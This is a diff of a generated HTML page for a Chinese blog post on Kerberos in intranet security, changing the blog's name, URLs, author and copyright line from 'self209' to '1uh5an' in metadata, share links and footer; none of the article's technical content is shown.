 <meta property="og:title" content="内网安全之kerberos(一)">
-<meta property="og:url" content="https://self209.github.io/2022/02/19/20220219/index.html">
-<meta property="og:site_name" content="self_209&#39;blog">
+<meta property="og:url" content="https://1uh5an.github.io/2022/02/19/20220219/index.html">
+<meta property="og:site_name" content="1uh5an&#39;blog">
 <meta property="og:description" content="参考：https:&#x2F;&#x2F;github.com&#x2F;daikerSec&#x2F;windows_protocol ​            https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;category_10225019.html ​            https:&#x2F;&#x2F;shenaniganslabs.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;Wagging-the-Dog.html">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404083204360.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404084017409.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404084942222.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404084730159.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404090545976.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404090746768.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404090628441.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404091222067.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404095320675.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404103828900.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404103851434.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404212953783.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404213205913.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404220529071.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404220807659.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404221355044.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404224907905.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404224954735.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404230034967.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404232425516.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404232500481.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404233114842.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404235717594.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404235752524.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404235908899.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405000009075.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405092519798.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405093106367.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405093202226.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405094321376.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405100501532.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405102448488.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405104037043.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405132404030.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405104828400.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405132640929.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405132736301.png">
-<meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/image-20220405132820830.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404083204360.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404084017409.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404084942222.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404084730159.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404090545976.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404090746768.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404090628441.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404091222067.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404095320675.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404103828900.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404103851434.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404212953783.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404213205913.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404220529071.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404220807659.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404221355044.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404224907905.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404224954735.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404230034967.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404232425516.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404232500481.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404233114842.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404235717594.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404235752524.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404235908899.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405000009075.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405092519798.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405093106367.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405093202226.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405094321376.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405100501532.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405102448488.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405104037043.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405132404030.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405104828400.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405132640929.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405132736301.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220405132820830.png">
 <meta property="article:published_time" content="2022-02-19T13:18:46.000Z">
 <meta property="article:modified_time" content="2022-04-08T15:04:00.893Z">
-<meta property="article:author" content="self_209">
+<meta property="article:author" content="1uh5an">
 <meta property="article:tag" content="内网安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://self209.github.io/2022/02/19/20220219/image-20220404083204360.png">
+<meta name="twitter:image" content="https://1uh5an.github.io/2022/02/19/20220219/image-20220404083204360.png">
     
     
         
@@ -70,8 +70,8 @@
     
     
     
-        <meta property="og:image" content="https://self209.github.io/2022/02/19/20220219/1920.jpg"/>
-        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2022/02/19/20220219/1920.jpg"/>
+        <meta property="og:image" content="https://1uh5an.github.io/2022/02/19/20220219/1920.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://1uh5an.github.io/2022/02/19/20220219/1920.jpg"/>
     
     
     <!--STYLES-->
@@ -101,7 +101,7 @@
             href="/"
             aria-label=""
         >
-            self_209&#39;blog
+            1uh5an&#39;blog
         </a>
     </div>
     
@@ -532,7 +532,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/02/19/20220219/"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://1uh5an.github.io/2022/02/19/20220219/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -545,7 +545,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/02/19/20220219/"
+                    target="new" href="https://plus.google.com/share?url=https://1uh5an.github.io/2022/02/19/20220219/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -558,7 +558,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/02/19/20220219/&amp;title=内网安全之kerberos(一)"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://1uh5an.github.io/2022/02/19/20220219/&amp;title=内网安全之kerberos(一)"
                     title="分享到 QQ"
                     aria-label="分享到 QQ"
                 >
@@ -587,7 +587,7 @@
 
                 <footer id="footer" class="main-content-wrap">
     <span class="copyrights">
-        Copyrights &copy; 2022 self_209. All Rights Reserved.
+        Copyrights &copy; 2023 1uh5an. All Rights Reserved.
     </span>
 </footer>
 
@@ -643,7 +643,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/02/19/20220219/"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://1uh5an.github.io/2022/02/19/20220219/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -656,7 +656,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/02/19/20220219/"
+                    target="new" href="https://plus.google.com/share?url=https://1uh5an.github.io/2022/02/19/20220219/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -669,7 +669,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/02/19/20220219/&amp;title=内网安全之kerberos(一)"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://1uh5an.github.io/2022/02/19/20220219/&amp;title=内网安全之kerberos(一)"
                     title="分享到 QQ"
                     aria-label="分享到 QQ"
                 >
@@ -701,7 +701,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/02/19/20220219/"
+                        href="https://twitter.com/intent/tweet?text=https://1uh5an.github.io/2022/02/19/20220219/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -714,7 +714,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=https://self209.github.io/2022/02/19/20220219/"
+                        href="https://plus.google.com/share?url=https://1uh5an.github.io/2022/02/19/20220219/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
@@ -727,7 +727,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/02/19/20220219/&amp;title=内网安全之kerberos(一)"
+                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://1uh5an.github.io/2022/02/19/20220219/&amp;title=内网安全之kerberos(一)"
                         aria-label="分享到 QQ"
                     >
                         <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
@@ -749,7 +749,7 @@
             <i class="fa fa-times"></i>
         </div>
         
-            <h4 id="about-card-name">self_209</h4>
+            <h4 id="about-card-name">1uh5an</h4>
         
             <div id="about-card-bio"><p>author.bio</p>
 </div>
